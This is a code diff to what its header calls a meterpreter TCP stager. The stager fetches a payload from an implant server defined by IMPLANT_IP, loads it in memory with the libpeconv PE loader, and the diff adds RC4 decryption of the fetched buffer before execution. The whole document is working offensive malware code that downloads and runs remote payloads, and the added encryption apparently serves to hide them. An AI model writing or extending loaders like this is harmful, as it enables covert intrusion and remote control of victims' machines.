@@ -1,6 +1,8 @@
 /**
 A basic meterpreter protocol (TCP) stager using libpeconv PE loader (EXE/DLL)
 built from: https://github.com/hasherezade/libpeconv_tpl
+
+  - featuring RC4 payload encryption support
 */
 
 #include <winsock2.h>
@@ -11,6 +13,8 @@ built from: https://github.com/hasherezade/libpeconv_tpl
 #include <tchar.h>
 
 #include <peconv.h> // include libPeConv header
+
+#include "cRC4.h"
 
 /* TCP meterpreter stager server parameters (ip, port) ::: define in Makefile */
 #ifndef IMPLANT_IP
@@ -79,6 +83,14 @@ void fetch_payload()
   }
   std::cout << "success!" << std::endl << std::flush;
   closesocket(s);
+
+#ifdef RC4_KEY
+  std::cout << "[*] RC4 decrypting buffer..." << std::flush;
+  CRC4 c((unsigned char *)RC4_KEY, 16);
+  c.RC4(buf, bufsize);
+  std::cout << "done." << std::endl << std::flush;
+#endif
+
   std::cout << "[*] peconv::load_pe_executable: " << std::flush;
   g_Payload = peconv::load_pe_executable(buf, bufsize, g_PayloadSize);
   std::cout << "success!\n" << std::endl << std::flush;
